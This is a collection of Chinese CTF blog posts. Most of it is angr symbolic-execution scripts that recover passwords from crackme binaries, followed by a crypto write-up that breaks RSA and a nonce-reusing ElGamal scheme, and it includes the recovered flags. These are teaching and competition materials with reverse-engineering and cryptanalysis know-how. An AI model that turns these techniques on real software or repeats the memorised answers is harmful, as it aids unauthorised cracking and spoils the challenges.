123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# This level performs the following computations:## 1. Get 16 bytes of user input and encrypt it.# 2. Save the result of check_equals_AABBCCDDEEFFGGHH (or similar)# 3. Get another 16 bytes from the user and encrypt it.# 4. Check that it's equal to a predefined password.## The ONLY part of this program that we have to worry about is #2. We will be# replacing the call to check_equals_ with our own version, using a hook, since# check_equals_ will run too slowly otherwise.import angrimport claripyimport sysdef main(argv): path_to_binary = '09_angr_hooks' project = angr.Project(path_to_binary) # Since Angr can handle the initial call to scanf, we can start from the # beginning. initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Hook the address of where check_equals_ is called. # (!) check_equals_called_address = 0x080493ce # The length parameter in angr.Hook specifies how many bytes the execution # engine should skip after completing the hook. This will allow hooks to # replace certain instructions (or groups of instructions). Determine the # instructions involved in calling check_equals_, and then determine how many # bytes are used to represent them in memory. This will be the skip length. # (!) instruction_to_skip_length = 5 @project.hook(check_equals_called_address, length=instruction_to_skip_length) def skip_check_equals_(state): # Determine the address where user input is stored. It is passed as a # parameter ot the check_equals_ function. Then, load the string. Reminder: # int check_equals_(char* to_check, int length) { ... user_input_buffer_address = 0x0804c044 # :integer, probably hexadecimal user_input_buffer_length = 0x10 # Reminder: state.memory.load will read the stored value at the address # user_input_buffer_address of byte length user_input_buffer_length. # It will return a bitvector holding the value. This value can either be # symbolic or concrete, depending on what was stored there in the program. user_input_string = state.memory.load( user_input_buffer_address, user_input_buffer_length ) # Determine the string this function is checking the user input against. # It's encoded in the name of this function; decompile the program to find # it. check_against_string = 'DOQTDXIUESUOZCMW' # :string # gcc uses eax to store the return value, if it is an integer. We need to # set eax to 1 if check_against_string == user_input_string and 0 otherwise. # However, since we are describing an equation to be used by z3 (not to be # evaluated immediately), we cannot use Python if else syntax. Instead, we # have to use claripy's built in function that deals with if statements. # claripy.If(expression, ret_if_true, ret_if_false) will output an # expression that evaluates to ret_if_true if expression is true and # ret_if_false otherwise. # Think of it like the Python &quot;value0 if expression else value1&quot;. state.regs.eax = claripy.If( user_input_string == check_against_string, claripy.BVV(1, 32), claripy.BVV(0, 32) ) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Since we are allowing Angr to handle the input, retrieve it by printing # the contents of stdin. Use one of the early levels as a reference. solution = solution_state.posix.dumps(sys.stdin.fileno()) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 10_angr_simprocedures看一下这丧心病狂函数调用图，发现check_equals_ 这个函数被调用了很多次 这里通过函数名来hook函数，通过hook_symbol来实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117# This challenge is similar to the previous one. It operates under the same# premise that you will have to replace the check_equals_ function. In this# case, however, check_equals_ is called so many times that it wouldn't make# sense to hook where each one was called. Instead, use a SimProcedure to write# your own check_equals_ implementation and then hook the check_equals_ symbol# to replace all calls to scanf with a call to your SimProcedure.## You may be thinking:# Why can't I just use hooks? The function is called many times, but if I hook# the address of the function itself (rather than the addresses where it is# called), I can replace its behavior everywhere. Furthermore, I can get the# parameters by reading them off the stack (with memory.load(regs.esp + xx)),# and return a value by simply setting eax! Since I know the length of the# function in bytes, I can return from the hook just before the 'ret'# instruction is called, which will allow the program to jump back to where it# was before it called my hook.# If you thought that, then congratulations! You have just invented the idea of# SimProcedures! Instead of doing all of that by hand, you can let the already-# implemented SimProcedures do the boring work for you so that you can focus on# writing a replacement function in a Pythonic way.# As a bonus, SimProcedures allow you to specify custom calling conventions, but# unfortunately it is not covered in this CTF.import angrimport claripyimport sysdef main(argv): path_to_binary = '10_angr_simprocedures' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # Define a class that inherits angr.SimProcedure in order to take advantage # of Angr's SimProcedures. class ReplacementCheckEquals(angr.SimProcedure): # A SimProcedure replaces a function in the binary with a simulated one # written in Python. Other than it being written in Python, the function # acts largely the same as any function written in C. Any parameter after # 'self' will be treated as a parameter to the function you are replacing. # The parameters will be bitvectors. Additionally, the Python can return in # the ususal Pythonic way. Angr will treat this in the same way it would # treat a native function in the binary returning. An example: # # int add_if_positive(int a, int b) { # if (a &gt;= 0 &amp;&amp; b &gt;= 0) return a + b; # else return 0; # } # # could be simulated with... # # class ReplacementAddIfPositive(angr.SimProcedure): # def run(self, a, b): # if a &gt;= 0 and b &gt;=0: # return a + b # else: # return 0 # # Finish the parameters to the check_equals_ function. Reminder: # int check_equals_AABBCCDDEEFFGGHH(char* to_check, int length) { ... # (!) def run(self, to_check, len): # We can almost copy and paste the solution from the previous challenge. # Hint: Don't look up the address! It's passed as a parameter. # (!) user_input_buffer_address = to_check user_input_buffer_length = len # Note the use of self.state to find the state of the system in a # SimProcedure. user_input_string = self.state.memory.load( user_input_buffer_address, user_input_buffer_length ) check_against_string = 'WXMXMQFENIXLIZMK' # Finally, instead of setting eax, we can use a Pythonic return statement # to return the output of this function. # Hint: Look at the previous solution. return claripy.If(check_against_string==user_input_string, claripy.BVV(1,32), claripy.BVV(0,32)) # Hook the check_equals symbol. Angr automatically looks up the address # associated with the symbol. Alternatively, you can use 'hook' instead # of 'hook_symbol' and specify the address of the function. To find the # correct symbol, disassemble the binary. # (!) check_equals_symbol = 'check_equals_WXMXMQFENIXLIZMK' # :string project.hook_symbol(check_equals_symbol, ReplacementCheckEquals()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 11_angr_sim_scanf利用上一题学到的hook知识去hook scanf函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667# This time, the solution involves simply replacing scanf with our own version,# since Angr does not support requesting multiple parameters with scanf.import angrimport claripyimport sysdef main(argv): path_to_binary = '11_angr_sim_scanf' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) class ReplacementScanf(angr.SimProcedure): # Finish the parameters to the scanf function. Hint: 'scanf(&quot;%u %u&quot;, ...)'. # (!) def run(self, format_string, scanf0_address, scanf1_address): # Hint: scanf0_address is passed as a parameter, isn't it? scanf0 = claripy.BVS('scanf0', 32) scanf1 = claripy.BVS('scanf1', 32) # The scanf function writes user input to the buffers to which the # parameters point. self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness) self.state.memory.store(scanf1_address, scanf1, endness=project.arch.memory_endness) # Now, we want to 'set aside' references to our symbolic values in the # globals plugin included by default with a state. You will need to # store multiple bitvectors. You can either use a list, tuple, or multiple # keys to reference the different bitvectors. # (!) self.state.globals['solution0'] = scanf0 self.state.globals['solution1'] = scanf1 scanf_symbol = '__isoc99_scanf' project.hook_symbol(scanf_symbol, ReplacementScanf()) simulation = project.factory.simgr(initial_state) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] # Grab whatever you set aside in the globals dict. stored_solutions0 = solution_state.solver.eval(solution_state.globals['solution0']) stored_solutions1 = solution_state.solver.eval(solution_state.globals['solution1']) solution = str(stored_solutions0)+' '+str(stored_solutions1) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 12_angr_veritesting利用Veritesting来解决路径爆炸问题 动态符号执行（DSE）和静态符号执行（SSE）一个为路径生成公式，一个为语句生成公式。前者生成公式时会产生很高的负载，但生成的公式很容易解；后者生成公式很容易，公式也能覆盖更多的路径，但是公式更长更难解。方法上的区别在于DSE会摘要路径汇合点上两条分支的情况，而SSE为两条分支fork两条独立的执行路径 SSE目前还不能对大规模的程序分析（如Cloud9+state merging），问题主要在于循环的表示、方程复杂度、缺少具体状态、和对syscall等的模拟。Veritesting可以在SSE和DSE之间切换，减少负载和公式求解难度，并解决静态方法需要摘要或其他方法才能处理的系统调用和间接跳转 简单来说就是Veritesting结合了静态符合执行与动态符号执行，减少了路径爆炸的影响，在angr里我们只要在构造模拟管理器时，启用Veritesting了就行 1project.factory.simgr(initial_state, veritesting=True) 1234567891011121314151617181920212223242526272829303132333435363738394041# When you construct a simulation manager, you will want to enable Veritesting:# project.factory.simgr(initial_state, veritesting=True)# Hint: use one of the first few levels' solutions as a reference.import angr import claripyimport sysdef main(argv): path_to_binary = '12_angr_veritesting' project = angr.Project(path_to_binary) initial_state = project.factory.entry_state( add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) simulation = project.factory.simgr(initial_state,veritesting=True) def is_successful(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Good Job.' in stdout_output def should_abort(state): stdout_output = state.posix.dumps(sys.stdout.fileno()) return b'Try again.' in stdout_output simulation.explore(find=is_successful, avoid=should_abort) if simulation.found: solution_state = simulation.found[0] solution = solution_state.posix.dumps(sys.stdin.fileno()).decode() print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 13_angr_static_binary拖进IDA后可以发现，文件是静态编译的，此时需要利用angr提供的函数hook掉静态库里的函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273# This challenge is the exact same as the first challenge, except that it was# compiled as a static binary. Normally, Angr automatically replaces standard# library functions with SimProcedures that work much more quickly.## To solve the challenge, manually hook any standard library c functions that# are used. Then, ensure that you begin the execution at the beginning of the# main function. Do not use entry_state.## Here are a few SimProcedures Angr has already written for you. They implement# standard library functions. You will not need all of them:# angr.SIM_PROCEDURES['libc']['malloc']# angr.SIM_PROCEDURES['libc']['fopen']# angr.SIM_PROCEDURES['libc']['fclose']# angr.SIM_PROCEDURES['libc']['fwrite']# angr.SIM_PROCEDURES['libc']['getchar']# angr.SIM_PROCEDURES['libc']['strncmp']# angr.SIM_PROCEDURES['libc']['strcmp']# angr.SIM_PROCEDURES['libc']['scanf']# angr.SIM_PROCEDURES['libc']['printf']# angr.SIM_PROCEDURES['libc']['puts']# angr.SIM_PROCEDURES['libc']['exit']## As a reminder, you can hook functions with something similar to:# project.hook(malloc_address, angr.SIM_PROCEDURES['libc']['malloc']())## There are many more, see:# https://github.com/angr/angr/tree/master/angr/procedures/libc## Additionally, note that, when the binary is executed, the main function is not# the first piece of code called. In the _start function, __libc_start_main is# called to start your program. The initialization that occurs in this function# can take a long time with Angr, so you should replace it with a SimProcedure.# angr.SIM_PROCEDURES['glibc']['__libc_start_main']# Note 'glibc' instead of 'libc'.import angrimport sysdef main(argv): path_to_binary = '13_angr_static_binary' # :string project = angr.Project(path_to_binary) initial_state = project.factory.blank_state( addr=0x08049e1f, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) # project.hook(0x0804a250,angr.SIM_PROCEDURES['glibc']['__libc_start_main']()) project.hook(0x08051340,angr.SIM_PROCEDURES['libc']['scanf']()) project.hook(0x080512f0,angr.SIM_PROCEDURES['libc']['printf']()) project.hook(0x0805ec90,angr.SIM_PROCEDURES['libc']['puts']()) project.hook(0x080490d0,angr.SIM_PROCEDURES['libc']['strcmp']()) project.hook(0x08050800,angr.SIM_PROCEDURES['libc']['exit']()) simulation = project.factory.simgr(initial_state) print_good_address = 0x08049f06 # :integer (probably in hexadecimal) simulation.explore(find=print_good_address) if simulation.found: solution_state = simulation.found[0] print(solution_state.posix.dumps(sys.stdin.fileno()).decode()) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 14_angr_shared_library拖进IDA，可以发现关键函数validate属于外部库 此时通过加载.so文件可以求解问题，这时需要指定基地址 123456base = 0x08048000project = angr.Project(path_to_binary, load_options={ 'main_opts' : { 'base_addr' : base }}) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879# The shared library has the function validate, which takes a string and returns# either true (1) or false (0). The binary calls this function. If it returns# true, the program prints &quot;Good Job.&quot; otherwise, it prints &quot;Try again.&quot;## Note: When you run this script, make sure you run it on# lib14_angr_shared_library.so, not the executable. This level is intended to# teach how to analyse binary formats that are not typical executables.import angrimport claripyimport sysdef main(argv): path_to_binary = 'lib14_angr_shared_library.so' # The shared library is compiled with position-independent code. You will need # to specify the base address. All addresses in the shared library will be # base + offset, where offset is their address in the file. # (!) base = 0x08048000 project = angr.Project(path_to_binary, load_options={ 'main_opts' : { 'base_addr' : base } }) # Initialize any symbolic values here; you will need at least one to pass to # the validate function. # (!) buffer_pointer = claripy.BVV(0x10000000, 32) # Begin the state at the beginning of the validate function, as if it was # called by the program. Determine the parameters needed to call validate and # replace 'parameters...' with bitvectors holding the values you wish to pass. # Recall that 'claripy.BVV(value, size_in_bits)' constructs a bitvector # initialized to a single value. # Remember to add the base value you specified at the beginning to the # function address! # Hint: int validate(char* buffer, int length) { ... # (!) validate_function_address = base + 0x129c initial_state = project.factory.call_state( validate_function_address, buffer_pointer, claripy.BVV(8,32) ) # Inject a symbolic value for the password buffer into the program and # instantiate the simulation. Another hint: the password is 8 bytes long. # (!) password = claripy.BVS( 'password', 64 ) initial_state.memory.store( buffer_pointer , password) simulation = project.factory.simgr(initial_state) # We wish to reach the end of the validate function and constrain the # return value of the function (stored in eax) to equal true (value of 1) # just before the function returns. We could use a hook, but instead we # can search for the address just before the function returns and then # constrain eax # (!) check_constraint_address = base + 0x134c simulation.explore(find=check_constraint_address) if simulation.found: solution_state = simulation.found[0] # Determine where the program places the return value, and constrain it so # that it is true. Then, solve for the solution and print it. # (!) solution_state.add_constraints( solution_state.regs.eax!=0 ) solution = solution_state.solver.eval(password,cast_to=bytes) print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) 15_angr_arbitrary_read16_angr_arbitrary_write17_angr_arbitrart_jump题目 from 各类比赛部分来源 angr-doc/examples at master · angr/angr-doc (github.com) [WUSTCTF2020]funnyre去掉花指令后： 123456789101112131415161718192021222324252627282930313233343536373839404142434445import angrimport claripyimport sysdef main(argv): path_to_binary = 'attachment' project = angr.Project(path_to_binary) start_address = 0x4005d9 initial_state = project.factory.blank_state( addr=start_address, add_options = { angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY, angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS} ) password0 = claripy.BVS('password0', 8*38) password0_address = initial_state.regs.rdx initial_state.memory.store(password0_address, password0) simulation = project.factory.simgr(initial_state) simulation.explore(find=0x401dae, avoid=0x401da2) if simulation.found: solution_state = simulation.found[0] # Solve for the symbolic values. We are trying to solve for a string. # Therefore, we will use eval, with named parameter cast_to=bytes # which returns bytes that can be decoded to a string instead of an integer. # (!) solution0 = solution_state.solver.eval(password0,cast_to=bytes).decode() solution = solution0 print(solution) else: raise Exception('Could not find the solution')if __name__ == '__main__': main(sys.argv) [ais3_crackme]12345678910111213141516171819202122232425262728293031323334353637383940414243#!/usr/bin/env python'''ais3_crackme has been developed by Tyler Nighswander (tylerni7) for ais3.It is an easy crackme challenge. It checks the command line argument.'''import angrimport claripydef main(): project = angr.Project(&quot;./ais3_crackme&quot;, auto_load_libs=False) #create an initial state with a symbolic bit vector as argv1 argv1 = claripy.BVS(&quot;argv1&quot;,100*8) #since we do not the length now, we just put 100 bytes initial_state = project.factory.entry_state(args=[&quot;./crackme1&quot;,argv1]) #create a path group using the created initial state sm = project.factory.simulation_manager(initial_state) #symbolically execute the program until we reach the wanted value of the instruction pointer sm.explore(find=0x400602) #at this instruction the binary will print(the &quot;correct&quot; message) found = sm.found[0] #ask to the symbolic solver to get the value of argv1 in the reached state as a string solution = found.solver.eval(argv1, cast_to=bytes) print(repr(solution)) solution = solution[:solution.find(b&quot;\\x00&quot;)] print(solution) return solutiondef test(): res = main() assert res == b&quot;ais3{I_tak3_g00d_n0t3s}&quot;if __name__ == '__main__': print(repr(main())) 参考资料 5.3 符号执行 · CTF All In One (gitbooks.io) 5.3.1 angr · CTF All In One (gitbooks.io) README - angr Documentation AngrCTF_FITM/笔记 at master · ZERO-A-ONE/AngrCTF_FITM (github.com)","link":"/2022/05/09/Reverse-angr/"},{"title":"WriteUp of DASCTF Jan Crypto","text":"Writeup of DasCTF Jan Crypto[签到题]babyRSA附件一：chall.py 12345678910111213141516171819202122232425262728import osfrom secret import FLAG,p,q,efrom Crypto.Util.number import bytes_to_long,long_to_bytesN = p*qdef encrypt(m,N,e): return pow(m,e,N)def decrypt(c,N,d): return pow(c,d,N)def padding(msg): res = msg if len(res) &lt; 128: res = res + os.urandom(128-len(res)) return resdef transfer(msg): assert len(msg) &lt; 128 m = padding(msg) return bytes_to_long(m)if __name__ == &quot;__main__&quot;: m = transfer(FLAG) print(N,e) print(encrypt(m,N,e)) 附件二 enc 1213123058934861171416713230498081453101147538789122070079961388806126697916963123413431108069961369055630747412550900239402710827847917960870358653962948282381351741121884528399369764530446509936240262290248305226552117100584726616255292963971141510518678552679033220315246377746270515853987903184512948801397452104554589803725619076066339968999308910127885089547678968793196148780382182445270838659078189316664538631875879022325427220682805580410213245364855569367702919157881367085677283124732874621569379901272662162025780608669577546548333274766058755786449491277002349918598971841605936268030140638579388226573929 21993444050767187234397761068183914169867746374174528181624770259579762134771917236641844074172347938149264183669057516897896991381236582927189515470739382448359233781032645742623198680727921871297555706961277968561362798136589237779330699241398622219476279693304507357580915558995515876051755678822535656131639723966406639590483110776910457915166718570203793342171416518556587956147610696870291406014395979782033752442433430526874886065448561168276810654141879579560499471430173054832001220333438573702236782364698874212615929305491367081600410014383502275942657148007530729391264646477039622603589304775707984208771492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524 看完附件后可以知道是比较简单的RSA类型 一开始看到e这么大便想到了维纳攻击，可是试了一下并没有解出d（还怀疑了一下脚本是不是出错了） 而后试了一下用yafu进行大数分解，并没有结果 最后还是得靠factordb.com(事实证明还是在线大数分解nb) 解出 12n=98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033*133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513 随后就可以随便算了 1234567891011from libnum import n2simport gmpy2p=133639826298015917901017908376475546339925646165363264658181838203059432536492968144231040597990919971381628901127402671873954769629458944972912180415794436700950304720548263026421362847590283353425105178540468631051824814390421486132775876582962969734956410033443729557703719598998956317920674659744121941513q=98197216341757567488149177586991336976901080454854408243068885480633972200382596026756300968618883148721598031574296054706280190113587145906781375704611841087782526897314537785060868780928063942914187241017272444601926795083433477673935377466676026146695321415853502288291409333200661670651818749836420808033e=2199344405076718723439776106818391416986774637417452818162477025957976213477191723664184407417234793814926418366905751689789699138123658292718951547073938244835923378103264574262319868072792187129755570696127796856136279813658923777933069924139862221947627969330450735758091555899551587605175567882253565613163972396640663959048311077691045791516671857020379334217141651855658795614761069687029140601439597978203375244243343052687488606544856116827681065414187957956049947143017305483200122033343857370223678236469887421261592930549136708160041001438350227594265714800753072939126464647703962260358930477570798420877c=1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524phi=(p-1)*(q-1)d=gmpy2.invert(e,phi)flag=pow(c,d,p)# print(flag)print(n2s(73358773651424897743944056106548202261075477721417992498861765573582087801960732601862778348189621203820703393958329215404058952130344307891818721974239491062466090539708313506265450891835557762707471433442189955809731728025144732654599245515720346423528093783755219533095697004480866822694256749445957788813)) 最终得到flag:hwctf{01d_Curs3_c4Me_Again} crypto_Elgamal题目代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from Crypto.Util.number import *from key import FLAGdef keygen(size): q = getPrime(80) k = getPrime(944) while True: p = q * k + 1 if isPrime(p): break k += 1 g = 2 while True: if pow(g, q, p) == 1: break g += 1 A = getRandomInteger(size) % q B = getRandomInteger(size) % q x = getRandomInteger(size) % q h = pow(g, x, p) return (g, h, A, B, p, q), (x)def rand(A, B, q): global rand_state rand_state, ret = (A * rand_state + B) % q, rand_state return retdef encrypt(pubkey, m): g, h, A, B, p, q = pubkey assert 0 &lt; m &lt;= p r = rand(A, B, q) c1 = pow(g, r, p) c2 = (m * pow(h, r, p)) % p return (c1, c2)rand_state = getPrime(1024)pubkey, privkey = keygen(1024)m = bytes_to_long(FLAG)c1, c2 = encrypt(pubkey, m)c1_, c2_ = encrypt(pubkey, m)print(c1, c2)print(c1_, c2_)s0 = 543263588863771657634119s1 = 628899245716105951093835s2 = 78708024695487418261582s3 = 598971435111109998816796s4 = 789474285039501272453373assert ( A * s0 + B ) % q == s1assert ( A * s1 + B ) % q == s2assert ( A * s2 + B ) % q == s3assert ( A * s3 + B ) % q == s4p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311g = 27642593390439430783453736408814717946185190497201679721975757020767271070510268596627490205095779429964809833535285315202625851326460572368018875381603399143376574281200028337681552876140857556460885848491160812604549770668188783258592940823128376128198726254875984002214053523752696104568469730021811399216h = 54585833166051670245656045196940486576634589000609010947618047461787934106392112227019662788387352615714332234871251868259282522817042504587428441746855906297390193418159792477477443129333707197013251839952389651332058368911829464978546505729530760951698134101053626585254469108630886768357270544236516534904c1 = 60724920570148295800083597588524297283595971970237964464679084640302395172192639331196385150232229004030419122038089044697951208850497923486467859070476427472465291810423905736825272208842988090394035980454248119048131354993356125895595138979611664707727518852984351599604226889848831071126576874892808080133c2 = 48616294792900599931167965577794374684760165574922600262773518630884983374432147726140430372696876107933565006549344582099592376234783044818320678499613925823621554608542446585829308488452057340023780821973913517239972817669309837103043456714481646128392677624092659929248296869048674230341175765084122344264c1_ = 42875731538109170678735196002365281622531058597803022779529275736483962610547258618168523955709341579773947887175626960699426438456382655370090748369934296474999389316334717699127421889816721511602392591677377678759026657582648354688447456509292302633971842316239774410380221303269351351929586256938787054867c2_ = 64829024929257668640929285124747107162970460545535885047576569803424908055130477684809317765011143527867645692710091307694839524199204611328374569742391489915929451079830143261799375621377093290249652912850024319433129432676683899459510155157108727860920017105870104383111111395351496171846620163716404148070 （分析不难，关键在于转化为RSA问题后对e和p-1不互素情况下根的求解） 粗略分析一下，发现有对同一flag加密得到的两组密文，而这两组密文的联系是随机数r1和r2。因此可以断定从伪随机数发生器入手，对密文组(c1,c2)，(c1_ , c2_ )进行变换从而得到flag(由于密钥x为止因此基本可以忽略c1和c1_) 而对于伪随机数发生器，题目也给了相应的提示： 12345678910s0 = 543263588863771657634119s1 = 628899245716105951093835s2 = 78708024695487418261582s3 = 598971435111109998816796s4 = 789474285039501272453373assert ( A * s0 + B ) % q == s1assert ( A * s1 + B ) % q == s2assert ( A * s2 + B ) % q == s3assert ( A * s3 + B ) % q == s4 线性方程组乱解一通后便得到了： 123q= 791763770658839585424113A=12742153496769814072597B=3035433788765894539799 接下来分析c2和c2_的关系，已c_2=m*h^{r_1}\\ mod\\ p,c_2\\_=m*h^{r_2}\\ mod\\ p，而r_2=r_1*A+B\\ mod\\ p 即： c_2\\_=m*h^{r_1*A+B}=m*h^{r_1*A}*h^B=m^{1-A}*(m*h^{r_1})^A*h^B=c_2^A*m^{1-A}*h^B\\ mod\\ p因此： m^{1-A}=c_2\\_*c_2^{-A}*h^{-B}\\ mod\\ p由此即可以得到$m^{1-A}\\ mod\\ p$的值，现在已经将Elgamal问题转换为加密指数e=1-A的类RSA问题了 问题棘手的地方在于$gcd(1-A,p-1)=7438$,无法直接对1-A求逆 接下来的解决方法可以参考这题：NCTF2019 easyRSA (附上写的非常详细的wpNCTF2019-官方writeup – 郁离歌丶的博客 (yulige.top))（接下来我都建议去看这篇wp） 实际上在$gcd(1-A,p-1)=e$的情况下，$m$有$e$个解 首先先尝试得到其中一个解： 详细方法和情形可以参考这篇paper1111.4877.pdf (arxiv.org) 快速定位到此处： 通过这个算法能找到方程其中的一个解 那么如何找到所有解呢？ 观察 x^{p-1}=1\\ mod\\ p\\\\ (x^{\\frac{p-1}{e}})^e=1\\ mod\\ p也就是说，若$r$是方程$x^e=c\\ mod\\ p$的一个解，那么 r^e=c\\ mod\\ p\\\\ (r*x^{i*\\frac{p-1}{e}})^e=r^e*x^{i*(p-1)}=r^e*1^i=c\\ mod\\ p(r*x^{i*\\frac{p-1}{e}})也是方程的解，其中$x$为$(1,p-1)$的一个随机数，$i \\in [0,e-1]$， 遍历$i$，既可以得到方程的所有解，最后在所有解中搜索符合字符串’flag’即可得到flag:flag{19e9f185e6a680324cedd6e6d9382743} （应该是没错的，写完的时候比赛已经结束了 /(ㄒoㄒ)/~~） 附上解方程的脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import randomfrom libnum import n2simport sympydef rth_root(cip,r,q): &quot;&quot;&quot; cip^r==q &amp;&amp; r|q-1 &quot;&quot;&quot; rnum=random.randint(1,q) while (pow(rnum,(q-1)//r,q)==1): rnum=random.randint(1,q) t=1 while((q-1)%pow(r,t)==0): t+=1 t-=1 s=(q-1)//pow(r,t) k = 1 while (k * s + 1) % r != 0: k += 1 alpha = (k * s + 1) // r a=pow(rnum,pow(r,t-1)*s,q) b=pow(cip,r*alpha-1,q) c=pow(rnum,s,q) h=1 print('t='+str(t)) for i in range(1,t): # print('1213') d=pow(b,pow(r,t-1-i),q) if d==1: j=0 else: j=(-sympy.discrete_log(q,d,a))%q b=b*(pow(pow(c,r,q),j,q))%q h=h*pow(c,j,q)%q c=pow(c,r,q)%q return pow(cip,alpha,q)*h%qdef findAllPRoot(root,p,e): maySolve=[root] while(len(maySolve)&lt;e): maySolve.append(root*pow(random.randint(2,p-1),(p-1)//e,p)%p) print('finish') return maySolveflag=52498780852251471256496883766677451330444042209592264044862955792645421608045437240170037309824495794108442986910150817628974914953272047997425815789167047966004466233826304133412591056777880709534691777621768967479001867448270089911182059438848229977940628161790899565867768072121376211486485752798175076955e=7438p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311r=rth_root(flag,e,p)print(r)print(pow(r,e,p)==flag)maySolve=findAllPRoot(r,p,e)# x=random.randint(1,p)# solve2=r*pow(x,(p-1)//e,p)%p# print(solve2)# print(pow(solve2,e,p)==flag)print('start')file=open('111.txt','wb')for i in maySolve: file.write(n2s(i)) （写得比较乱，如有错漏还请客官指出）","link":"/2022/01/25/Writeup-of-DASCTF2022-Jan-Crypto2/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2022/01/19/hello-world/"},{"title":"堆栈平衡","text":"参考：堆栈平衡 - cat47 - 博客园 (cnblogs.com) （本篇其实也就搬运了一下） 什么是堆栈平衡 如果要返回父程序，则当我们在堆栈中进行堆栈的操作的时候，一定要保证在RET这条指令前,ESP指向的是我们压入栈中的地址 如果通过堆栈传递参数来，那么在函数执行完毕后，要平衡参数导致的堆栈变化 含义就是当函数在一步步执行的时候一直到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。 如果堆栈变化了，就要走ret执行前将堆栈恢复成原来的样子 会影响堆栈的情况1. 函数中push进栈例如： 1234call xx函数函数： mov ...(不影响堆栈平衡) push ...(影响堆栈平衡) ret... 2. 堆栈传递参数函数调用时传递参数通过向栈中压入参数完成，在被调用函数完成后该传递的参数也就失去了作用，需要将堆栈恢复到调用前的位置，例如： 主函数： 